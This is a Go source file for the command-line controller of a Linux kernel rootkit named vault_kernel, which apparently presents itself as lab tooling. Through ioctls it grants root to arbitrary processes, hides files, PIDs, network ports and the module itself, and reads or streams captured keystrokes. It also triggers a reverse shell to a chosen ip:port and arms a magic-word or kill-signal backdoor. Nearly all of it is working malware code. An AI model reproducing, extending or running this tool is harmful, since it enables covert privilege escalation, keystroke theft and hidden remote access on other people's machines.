package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
)

const clientVersion = "3.6"

const devicePath = "/dev/vault_kernel"

// sysfsModulePath is where the kernel exposes loaded modules; absence
// (once stats work) means the module is hidden from lsmod/sysfs.
const sysfsModulePath = "/sys/module/vault_kernel"

func openDevice() (*os.File, error) {
	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
	if err != nil {
		return nil, fmt.Errorf("cannot open %s: %w (is rootkit loaded?)", devicePath, err)
	}
	return f, nil
}

// verifyRootSelf reports whether THIS process is root right after the
// GIVE_ROOT ioctl: the ioctl runs in the caller's task context, so
// commit_creds() takes effect on the CLI process itself immediately.
func verifyRootSelf() bool {
	return os.Geteuid() == 0
}

// verifyRootRemote checks the effective uid of another PID through
// /proc/<pid>/status (4th field of the Uid: line is euid).
func verifyRootRemote(pid int) bool {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "Uid:") {
			fields := strings.Fields(line)
			if len(fields) >= 3 {
				return fields[2] == "0"
			}
		}
	}
	return false
}

func giveRoot(f *os.File, pid int) error {
	if pid == 0 {
		pid = os.Getpid()
	}
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GIVE_ROOT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	if pid == os.Getpid() {
		// The module ran commit_creds() on our own task — verify it.
		if verifyRootSelf() {
			fmt.Printf("[+] Granted root to PID %d (verified: euid=0)\n", pid)
		} else {
			fmt.Printf("[?] ioctl succeeded but euid is still %d — check dmesg\n", os.Geteuid())
		}
		return nil
	}
	fmt.Printf("[+] Granted root to PID %d\n", pid)
	if verifyRootRemote(pid) {
		fmt.Printf("    Verified via /proc/%d/status: euid=0\n", pid)
	} else {
		fmt.Printf("    (could not verify euid via /proc/%d/status)\n", pid)
	}
	return nil
}

func hideFile(f *os.File, name string) error {
	if name == "" {
		return fmt.Errorf("file name cannot be empty")
	}
	if len(name) > 255 {
		return fmt.Errorf("name too long (%d bytes): the kernel hide-list stores at most 255", len(name))
	}
	buf := make([]byte, 256)
	copy(buf, name)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_FILE, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding file/dir: %s\n", name)
	return nil
}

func unhideFile(f *os.File, name string) error {
	if name == "" {
		return fmt.Errorf("file name cannot be empty")
	}
	if len(name) > 255 {
		return fmt.Errorf("name too long (%d bytes): the kernel hide-list stores at most 255", len(name))
	}
	buf := make([]byte, 256)
	copy(buf, name)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_FILE, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed: %s\n", name)
	return nil
}

func hidePID(f *os.File, pid int) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_PID, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding PID: %d\n", pid)
	return nil
}

func unhidePID(f *os.File, pid int) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_PID, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed PID: %d\n", pid)
	return nil
}

func hidePort(f *os.File, port uint16) error {
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, port)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_PORT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding port: %d\n", port)
	return nil
}

func unhidePort(f *os.File, port uint16) error {
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, port)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_PORT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed port: %d\n", port)
	return nil
}

func listHidden(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("(nothing hidden)")
	} else {
		fmt.Print(output)
	}
	return nil
}

// listHiddenJSON emits the LIST_HIDDEN report as JSON for lab scripts:
// {"pids": [...], "files": [...], "ports": [...]}.  Empty sections
// marshal as [] (the parser returns non-nil slices).
func listHiddenJSON(f *os.File) error {
	buf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&buf[0])); err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	hl := ioctl.ParseHiddenList(output)
	j, err := json.MarshalIndent(hl, "", "  ")
	if err != nil {
		return err
	}
	fmt.Println(string(j))
	return nil
}

func keylogRead(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("[*] (no keystrokes captured)")
	} else {
		fmt.Printf("[*] Keystroke log:\n%s\n", output)
	}
	return nil
}

// keylogFollow polls KEYLOG_READ and streams new keystrokes as they
// arrive.  The module's buffer shifts left when full, so a suffix
// diff is printed when the common prefix breaks (buffer wrap).
// Exits on Ctrl-C (default SIGINT handling).
func keylogFollow(f *os.File, intervalMs int) error {
	fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
	prev := ""
	for {
		buf := make([]byte, 4096)
		if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0])); err != 0 {
			return err
		}
		cur := strings.TrimRight(string(buf), "\x00")
		if cur != prev {
			if len(cur) >= len(prev) && strings.HasPrefix(cur, prev) {
				fmt.Print(cur[len(prev):])
			} else {
				// Buffer wrapped: common prefix lost.
				fmt.Print("\n" + cur)
			}
			prev = cur
		}
		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
	}
}

func keylogClear(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_CLEAR, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Keylogger buffer cleared")
	return nil
}

func backdoorShell(f *os.File, target string) error {
	if len(target) > 255 {
		return fmt.Errorf("target too long (%d bytes): kernel buffer stores at most 255", len(target))
	}
	buf := make([]byte, 256)
	copy(buf, target)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_BACKDOOR_SHELL, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Reverse shell triggered -> %s\n", target)
	return nil
}

func backdoorMagic(f *os.File, word string) error {
	if word == "" {
		return fmt.Errorf("magic word cannot be empty (an empty word disables the backdoor only via reset)")
	}
	if len(word) > 15 {
		return fmt.Errorf("magic word too long (%d chars): module stores at most 15", len(word))
	}
	buf := make([]byte, 16)
	copy(buf, word)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_BACKDOOR_MAGIC, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Magic packet backdoor enabled: '%s'\n", word)
	return nil
}

func hideModule(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_MODULE_HIDE, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Module hidden from lsmod")
	return nil
}

func unhideModule(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_MODULE_UNHIDE, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[-] Module visible again in lsmod")
	return nil
}

func resetAll(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_RESET_ALL, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Reset: all hidden files, PIDs and ports cleared")
	return nil
}

func showStats(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("(no stats returned)")
	} else {
		fmt.Print(output)
	}
	return nil
}

// showStatsJSON re-emits the GET_STATS key=value report as JSON so
// lab scripts can consume it without text munging. Numeric values
// are converted to JSON numbers, the rest stay strings.
// v3.6: parsing goes through the shared token-based ParseStatsReport —
// the previous line-based split lost every pair after the first on
// each line (version, hooks_planned, hidden_pids, hidden_ports).
func showStatsJSON(f *os.File) error {
	buf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
		return err
	}
	raw := ioctl.ParseStatsReport(strings.TrimRight(string(buf), "\x00"))
	if len(raw) == 0 {
		return fmt.Errorf("module returned an empty stats report")
	}
	out := make(map[string]interface{}, len(raw))
	for k, v := range raw {
		if n, err := strconv.Atoi(v); err == nil {
			out[k] = n
		} else {
			out[k] = v
		}
	}
	j, err := json.MarshalIndent(out, "", "  ")
	if err != nil {
		return err
	}
	fmt.Println(string(j))
	return nil
}

func magicEncode(word string, port uint16) error {
	if word == "" {
		return fmt.Errorf("magic word cannot be empty")
	}
	encoded := ioctl.MagicPID(word, port)
	fmt.Printf("[*] Magic word : %s (hash 0x%04X)\n", word, ioctl.FNV1a16(word))
	fmt.Printf("[*] Port       : %d\n", port)
	fmt.Printf("[*] Encoded PID: %d\n", encoded)
	fmt.Printf("[*] Trigger    : kill -s %d %d\n",
		ioctl.MagicSignal, encoded)
	fmt.Printf("[*] (signal %d = glibc SIGRTMIN+1; matches MAGIC_SIGNAL in src/backdoor.c)\n",
		ioctl.MagicSignal)
	return nil
}

// doctorReport is the machine-readable form of runDoctor. Pointer
// fields are omitted from the JSON when the corresponding check could
// not run (module unreachable, version not reported, ...).
type doctorReport struct {
	ClientVersion  string `json:"client_version"`
	DevicePresent  bool   `json:"device_present"`
	DeviceOpen     bool   `json:"device_open,omitempty"`
	StatsResponds  bool   `json:"stats_responds,omitempty"`
	ModuleVersion  string `json:"module_version,omitempty"`
	VersionMatch   *bool  `json:"version_match,omitempty"`
	UptimeS        *int64 `json:"uptime_s,omitempty"`
	HooksInstalled *int   `json:"hooks_installed,omitempty"`
	HooksPlanned   *int   `json:"hooks_planned,omitempty"`
	ModuleInSysfs  *bool  `json:"module_in_sysfs,omitempty"`
	KeylogResponds *bool  `json:"keylog_responds,omitempty"`
	ListResponds   *bool  `json:"list_responds,omitempty"`
	Warnings       int    `json:"warnings"`
}

func renderDoctorJSON(rep *doctorReport) {
	j, err := json.MarshalIndent(rep, "", "  ")
	if err != nil {
		fmt.Println("{}")
		return
	}
	fmt.Println(string(j))
}

// runDoctor performs lab sanity checks against a loaded module: device
// node, permissions, stats ABI, hook count, client/module version match,
// module stealth state and every read-only control interface. It exits
// non-zero only when the module is unreachable; warnings do not fail.
// With jsonMode it prints a single JSON document instead of text, so
// lab scripts can consume it with jq.
func runDoctor(jsonMode bool) error {
	rep := doctorReport{ClientVersion: clientVersion}
	say := func(format string, a ...interface{}) {
		if !jsonMode {
			fmt.Printf(format, a...)
		}
	}
	fail := func(err error) error {
		// Failure states still emit the JSON document (with
		// the checks that ran); text mode keeps the original
		// behavior of stopping without the trailer.
		if jsonMode {
			renderDoctorJSON(&rep)
		}
		return err
	}

	say("[*] vault_kernel doctor — lab diagnostics\n")
	say("\n")

	// 1. Device node present?
	st, err := os.Stat(devicePath)
	if err != nil {
		say("  [FAIL] %s not found — module is not loaded\n", devicePath)
		say("         Load it first: sudo insmod vault_kernel.ko\n")
		return fail(fmt.Errorf("module not loaded"))
	}
	rep.DevicePresent = true
	say("  [ OK ] device %s present (mode %s)\n", devicePath, st.Mode().String())

	// 2. Device opens read/write?
	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
	if err != nil {
		say("  [FAIL] cannot open %s: %v\n", devicePath, err)
		say("         EACCES/EPERM → run with sudo (module also rejects non-root since v3.4).\n")
		return fail(err)
	}
	defer f.Close()
	rep.DeviceOpen = true
	say("  [ OK ] device opens read/write\n")

	// 3. GET_STATS responds?
	buf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
		say("  [FAIL] GET_STATS failed: %v\n", err)
		say("         If this is ENOTTY, the client and module versions are out of sync.\n")
		return fail(err)
	}
	rep.StatsResponds = true
	/* The stats report carries MULTIPLE key=value pairs per line —
	 * parse it with the shared token-based parser (see
	 * internal/vaultkernel/report.go for the v3.4/v3.5 bug this
	 * replaces). */
	stats := ioctl.ParseStatsReport(strings.TrimRight(string(buf), "\x00"))
	say("  [ OK ] GET_STATS responds\n")
	say("         module version : %s\n", stats["version"])
	say("         uptime_s       : %s\n", stats["uptime_s"])
	rep.ModuleVersion = stats["version"]
	if n, err := strconv.ParseInt(stats["uptime_s"], 10, 64); err == nil {
		rep.UptimeS = &n
	}

	// 4. Client/module version match
	if v := stats["version"]; v != "" {
		match := v == clientVersion
		rep.VersionMatch = &match
		if !match {
			say("  [WARN] client v%s != module v%s — ioctl ABI may differ\n", clientVersion, v)
			rep.Warnings++
		}
	}

	// 5. Hooks installed
	if h := stats["hooks_installed"]; h != "" {
		n, err := strconv.Atoi(h)
		if err != nil {
			say("  [WARN] hooks_installed not numeric: %q\n", h)
			rep.Warnings++
		} else {
			rep.HooksInstalled = &n
			if p, perr := strconv.Atoi(stats["hooks_planned"]); perr == nil {
				rep.HooksPlanned = &p
				say("  [ OK ] %d/%d syscall hooks installed\n", n, p)
			} else {
				say("  [ OK ] %d syscall hooks installed\n", n)
			}
			if n == 0 {
				say("  [WARN] 0 syscall hooks installed — hiding features are inactive\n")
				rep.Warnings++
			}
		}
	}

	// 6. Stealth state (informational, never a warning)
	{
		_, err := os.Stat(sysfsModulePath)
		visible := err == nil
		rep.ModuleInSysfs = &visible
		if visible {
			say("  [INFO] module visible in /sys/module — not hidden\n")
		} else {
			say("  [INFO] module not in /sys/module — hidden from lsmod/sysfs\n")
		}
	}

	// 7. Keylog interface
	kb := make([]byte, 4096)
	{
		_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&kb[0]))
		ok := err == 0
		rep.KeylogResponds = &ok
		if !ok {
			say("  [WARN] KEYLOG_READ failed: %v\n", err)
			rep.Warnings++
		} else {
			say("  [ OK ] keylog interface responds\n")
		}
	}

	// 8. List interface
	lb := make([]byte, 4096)
	{
		_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&lb[0]))
		ok := err == 0
		rep.ListResponds = &ok
		if !ok {
			say("  [WARN] LIST_HIDDEN failed: %v\n", err)
			rep.Warnings++
		} else {
			say("  [ OK ] list interface responds\n")
		}
	}

	if jsonMode {
		renderDoctorJSON(&rep)
		return nil
	}
	fmt.Println()
	if rep.Warnings > 0 {
		fmt.Printf("[*] doctor finished with %d warning(s)\n", rep.Warnings)
	} else {
		fmt.Println("[*] doctor finished: everything OK")
	}
	return nil
}

func printVersion() {
	fmt.Printf("vault_kernel CLI v%s (ioctl magic 0xC0, signal trigger %d)\n",
		clientVersion, ioctl.MagicSignal)
}

func printUsage() {
	fmt.Print(`vault_kernel CLI — Kernel Rootkit Control

Usage:
  vault_kernel <command> [arguments]

Commands:
  status                  Check if rootkit is loaded
  doctor [--json]         Diagnose module/client state (lab sanity check)
  give-root [pid]         Escalate process to root (default: self)
  hide-file <name>        Hide a file/directory
  unhide-file <name>      Reveal a hidden file/directory
  hide-pid <pid>          Hide a process from ps, top, /proc
  unhide-pid <pid>        Reveal a hidden process
  hide-port <port>        Hide a TCP/UDP port from netstat, ss
  unhide-port <port>      Reveal a hidden port
  list [--json]           List all hidden items
  stats                   Show module stats (version, hooks, counts)
  stats --json            Same, as machine-readable JSON
  shell <ip:port>         Trigger reverse shell
  magic <word>            Set magic packet trigger word
  magic-encode <word> <port>  Print the kill() trigger for a word+port
  keylog [--follow [ms]]  Read captured keystrokes (stream with --follow)
  keylog-clear            Clear keylogger buffer
  hide-module             Hide rootkit from lsmod
  unhide-module           Make rootkit visible in lsmod
  reset                   Clear ALL hidden files, PIDs and ports
  version                 Print client version
`)
}

func run() error {
	if len(os.Args) < 2 {
		printUsage()
		return nil
	}

	if os.Args[1] == "status" {
		if _, err := os.Stat(devicePath); err == nil {
			fmt.Printf("[*] vault_kernel kernel module is LOADED\n    Device: %s\n", devicePath)
		} else {
			fmt.Println("[*] vault_kernel kernel module is NOT loaded")
			fmt.Println("    Run: sudo insmod vault_kernel.ko")
		}
		return nil
	}

	if os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "help" {
		printUsage()
		return nil
	}

	if os.Args[1] == "version" || os.Args[1] == "-v" || os.Args[1] == "--version" {
		printVersion()
		return nil
	}

	if os.Args[1] == "doctor" {
		return runDoctor(len(os.Args) > 2 && os.Args[2] == "--json")
	}

	if os.Args[1] == "magic-encode" {
		if len(os.Args) < 4 {
			return fmt.Errorf("usage: vault_kernel magic-encode <word> <port>")
		}
		p, err := strconv.Atoi(os.Args[3])
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port: %s", os.Args[3])
		}
		return magicEncode(os.Args[2], uint16(p))
	}

	f, err := openDevice()
	if err != nil {
		return err
	}
	defer f.Close()

	cmd := os.Args[1]

	switch cmd {
	case "give-root":
		pid := 0
		if len(os.Args) > 2 {
			pid, _ = strconv.Atoi(os.Args[2])
		}
		return giveRoot(f, pid)

	case "hide-file":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel hide-file <name>")
		}
		return hideFile(f, os.Args[2])

	case "unhide-file":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel unhide-file <name>")
		}
		return unhideFile(f, os.Args[2])

	case "hide-pid":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel hide-pid <pid>")
		}
		pid, err := strconv.Atoi(os.Args[2])
		if err != nil {
			return fmt.Errorf("invalid PID: %s", os.Args[2])
		}
		return hidePID(f, pid)

	case "unhide-pid":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel unhide-pid <pid>")
		}
		pid, err := strconv.Atoi(os.Args[2])
		if err != nil {
			return fmt.Errorf("invalid PID: %s", os.Args[2])
		}
		return unhidePID(f, pid)

	case "hide-port":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel hide-port <port>")
		}
		p, err := strconv.Atoi(os.Args[2])
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port: %s", os.Args[2])
		}
		return hidePort(f, uint16(p))

	case "unhide-port":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel unhide-port <port>")
		}
		p, err := strconv.Atoi(os.Args[2])
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port: %s", os.Args[2])
		}
		return unhidePort(f, uint16(p))

	case "list":
		if len(os.Args) > 2 && os.Args[2] == "--json" {
			return listHiddenJSON(f)
		}
		return listHidden(f)

	case "stats":
		if len(os.Args) > 2 && os.Args[2] == "--json" {
			return showStatsJSON(f)
		}
		return showStats(f)

	case "shell":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel shell <ip:port>")
		}
		target := os.Args[2]
		if !strings.Contains(target, ":") {
			return fmt.Errorf("invalid target format, use ip:port")
		}
		return backdoorShell(f, target)

	case "magic":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel magic <word>")
		}
		return backdoorMagic(f, os.Args[2])

	case "version":
		printVersion()
		return nil

	case "keylog":
		if len(os.Args) > 2 && os.Args[2] == "--follow" {
			interval := 500
			if len(os.Args) > 3 {
				n, err := strconv.Atoi(os.Args[3])
				if err != nil || n < 50 {
					return fmt.Errorf("invalid interval: %s (milliseconds, min 50)", os.Args[3])
				}
				interval = n
			}
			return keylogFollow(f, interval)
		}
		return keylogRead(f)

	case "keylog-clear":
		return keylogClear(f)

	case "hide-module":
		return hideModule(f)

	case "unhide-module":
		return unhideModule(f)

	case "reset":
		return resetAll(f)

	default:
		return fmt.Errorf("unknown command: %s\nRun 'vault_kernel help' for usage", cmd)
	}
}

func main() {
	if os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "[!] Warning: not running as root. Some commands may fail.")
	}
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error: %v\n", err)
		os.Exit(1)
	}
}
